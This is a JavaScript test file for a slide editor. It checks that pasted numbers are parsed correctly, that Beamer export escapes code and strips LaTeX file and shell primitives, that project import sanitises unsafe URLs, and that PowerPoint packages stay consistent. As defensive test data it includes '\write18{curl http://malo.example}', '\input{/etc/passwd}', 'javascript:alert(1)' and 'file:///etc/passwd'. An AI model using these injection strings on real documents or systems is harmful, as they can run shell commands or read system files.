import test from 'node:test';import assert from 'node:assert/strict';import {inflateRawSync,crc32} from 'node:zlib';import {editor} from '../herramientas/test-browser.mjs';

/* Lector mínimo de ZIP: recorre el directorio central, descomprime cada
   entrada y comprueba su CRC. Sirve para mirar el .pptx por dentro sin
   dependencias y sin confiar en la misma rutina que lo escribió. */
function leeZip(bytes){
 const b=Buffer.from(bytes);const u16=o=>b.readUInt16LE(o),u32=o=>b.readUInt32LE(o);
 let fin=b.length-22;while(fin>=0&&u32(fin)!==0x06054b50)fin--;
 assert.ok(fin>=0,'el archivo no termina en un directorio central de ZIP');
 const total=u16(fin+10);let p=u32(fin+16);const salida=new Map();
 for(let i=0;i<total;i++){
  assert.equal(u32(p),0x02014b50,'entrada '+i+' del directorio central');
  const metodo=u16(p+10),suma=u32(p+16),comp=u32(p+20),plano=u32(p+24);
  const ln=u16(p+28),le=u16(p+30),lc=u16(p+32),desplaza=u32(p+42);
  const nombre=b.slice(p+46,p+46+ln).toString('utf8');
  assert.equal(u32(desplaza),0x04034b50,'cabecera local de '+nombre);
  const ln2=u16(desplaza+26),le2=u16(desplaza+28);
  const inicio=desplaza+30+ln2+le2;
  const crudo=b.slice(inicio,inicio+comp);
  const datos=metodo===8?inflateRawSync(crudo):crudo;
  assert.equal(datos.length,plano,'tamaño de '+nombre);
  assert.equal(crc32(datos)>>>0,suma,'CRC de '+nombre);
  salida.set(nombre,datos.toString('utf8'));
  p+=46+ln+le+lc;
 }
 return salida;
}

test('Pasted data keeps its decimals whatever separator Excel used',async()=>{const{dom,run,errors}=await editor();try{
 const t=s=>JSON.parse(run('JSON.stringify(parseTable('+JSON.stringify(s)+'))'));
 assert.deepEqual(t('C\tAbsorbancia\n0\t0,004\n2\t0,118').rows,[[0,0.004],[2,0.118]]);
 assert.deepEqual(t('C;Absorbancia\n0;0,004\n2;0,118').rows,[[0,0.004],[2,0.118]]);
 assert.deepEqual(t('C\tAbsorbancia\n0\t0.004\n2\t0.118').rows,[[0,0.004],[2,0.118]]);
 assert.deepEqual(t('0,0.004\n2,0.118').rows,[[0,0.004],[2,0.118]]);
 assert.deepEqual(t('C\tA\n0\t1.234,5').rows,[[0,1234.5]]);
 assert.deepEqual(t('C\tAbsorbancia\n0\t0,004').headers,['C','Absorbancia']);
 assert.deepEqual(errors,[]);
}finally{dom.window.close();}});

test('Beamer marks code frames fragile, escapes them and drops file and shell primitives',async()=>{const{dom,run,errors}=await editor();try{
 const bloques=[
  {id:'cod',type:'code',text:'print(f"m: {x:.3f}")\nruta = C:\\datos',lang:'python'},
  {id:'ec',type:'math',tex:'x \\input{/etc/passwd}'},
  {id:'re',type:'chem',tex:'\\write18{curl http://malo.example}'},
  {id:'tx',type:'text',text:'en línea $\\input{/etc/passwd}$ fin'}];
 run('window.__deck=EJEMPLOS[0].build();__deck.slides[1].blocks.push(...'+JSON.stringify(bloques)+');window.__tex=toBeamer(__deck)');
 const tex=run('window.__tex');
 const frames=tex.split('\n').filter(l=>l.startsWith('\\begin{frame}'));
 assert.equal(frames.filter(l=>l.includes('fragile')).length,1,'solo el frame con código lleva [fragile]');
 assert.match(frames.find(l=>l.includes('fragile')),/^\\begin\{frame\}\[fragile\]/);
 assert.match(tex,/print\(f"m: \\\{x:\.3f\\\}"\)/);
 assert.match(tex,/ruta = C:\\textbackslash\{\}datos/);
 for(const orden of ['\\input{','\\write18'])assert.equal(tex.includes(orden),false,orden+' debía retirarse');
 assert.equal((tex.match(/retirado\]/g)||[]).length,3);
 assert.deepEqual(errors,[]);
}finally{dom.window.close();}});

test('Imported projects keep working sources and report the ones that phone home',async()=>{const{dom,run,errors}=await editor();try{
 run(`window.__r=saneaDeck((()=>{const d=EJEMPLOS[0].build();
  d.meta.logo='https://rastreador.example/pixel.png';
  d.slides[1].blocks.push({id:'i1',type:'image',src:'https://remoto.example/f.png',w:40});
  d.slides[1].blocks.push({id:'i2',type:'image',src:'javascript:alert(1)',w:40});
  d.slides[1].blocks.push({id:'i3',type:'image',src:'data:image/png;base64,iVBORw0KGgo=',poster:'file:///etc/passwd',w:40});
  return d;})())`);
 const r=JSON.parse(run('JSON.stringify(window.__r)'));
 assert.ok(r.deck,JSON.stringify(r));
 const bl=id=>r.deck.slides[1].blocks.find(b=>b.id===id);
 assert.equal(bl('i2').src,undefined,'javascript: no debe sobrevivir');
 assert.equal(bl('i3').poster,undefined,'file:// no debe sobrevivir');
 assert.equal(bl('i1').src,'https://remoto.example/f.png');
 assert.match(r.avisos.join(' · '),/rastreador\.example/);
 assert.match(r.avisos.join(' · '),/remoto\.example/);
 assert.deepEqual(errors,[]);
}finally{dom.window.close();}});

test('PowerPoint package stays consistent when a branch hides slides',async()=>{const{dom,run,errors}=await editor();try{
 /* JSDOM no carga imágenes ni tiene lienzo: rasteriza() no resolvería nunca.
    Se comprueba la estructura del paquete, no la geometría de las formas. */
 run(`window.rasteriza=async()=>null;window.__pptx=null;window.downloadFile=async(n,b)=>{window.__pptx={n,bytes:await new Promise(ok=>{const fr=new FileReader();fr.onload=()=>ok(Array.from(new Uint8Array(fr.result)));fr.readAsArrayBuffer(b)})};return true};
  wsNueva(EJEMPLOS[0].build());
  S.deck.meta.ramas=[{id:'r1',n:'Corta',fuera:[S.deck.slides[2].id,S.deck.slides[4].id],nivel:null,titulo:''}];
  S.deck.meta.rama='r1'`);
 await run('exportPPTX()');
 const cap=run('window.__pptx');
 assert.ok(cap,'la exportación no entregó ningún archivo');
 assert.match(cap.n,/\.pptx$/);
 const partes=leeZip(Uint8Array.from(cap.bytes));
 const nombres=[...partes.keys()];
 const slides=nombres.filter(n=>/^ppt\/slides\/slide\d+\.xml$/.test(n));
 assert.equal(slides.length,4,'6 diapositivas menos las 2 fuera de la rama');
 const tipos=partes.get('[Content_Types].xml');
 const rels=partes.get('ppt/_rels/presentation.xml.rels');
 for(const decl of [...tipos.matchAll(/PartName="\/(ppt\/(?:slides|notesSlides)\/[^"]+)"/g)].map(m=>m[1]))
  assert.ok(partes.has(decl),'declarada en [Content_Types].xml pero ausente: '+decl);
 for(const t of [...rels.matchAll(/Target="(slides\/slide\d+\.xml)"/g)].map(m=>m[1]))
  assert.ok(partes.has('ppt/'+t),'referenciada por presentation.xml.rels pero ausente: ppt/'+t);
 for(const n of nombres.filter(x=>/^ppt\/slides\/_rels\//.test(x)))
  assert.ok(partes.has('ppt/slides/'+n.split('/').pop().replace('.rels','')),'rels huérfano: '+n);
 for(const n of nombres.filter(x=>/^ppt\/notesSlides\/notesSlide\d+\.xml$/.test(x)))
  assert.ok(partes.has('ppt/slides/slide'+n.replace(/\D+/g,'')+'.xml'),'nota sin diapositiva: '+n);
 assert.match(partes.get('docProps/app.xml'),/<Slides>4<\/Slides>/);
 assert.deepEqual(errors,[]);
}finally{dom.window.close();}});

test('Loading or undoing while the title has focus does not write the old title back',async()=>{const{dom,run,errors}=await editor();try{
 const campo=()=>run("document.getElementById('deckTitleInput').value");
 run("wsNueva(EJEMPLOS[0].build());document.getElementById('deckTitleInput').focus()");
 assert.equal(campo(),'Calibración UV–Vis');
 run('wsNueva(EJEMPLOS[5].build())');
 assert.equal(run('document.activeElement.id'),'deckTitleInput');
 assert.equal(campo(),run('S.deck.meta.title'));
 assert.equal(campo(),'Equilibrio ácido–base');
 run("S.deck.meta.title='Titulo NUEVO';commit();doUndo()");
 assert.equal(run('S.deck.meta.title'),'Equilibrio ácido–base');
 assert.equal(campo(),'Equilibrio ácido–base');
 assert.deepEqual(errors,[]);
}finally{dom.window.close();}});
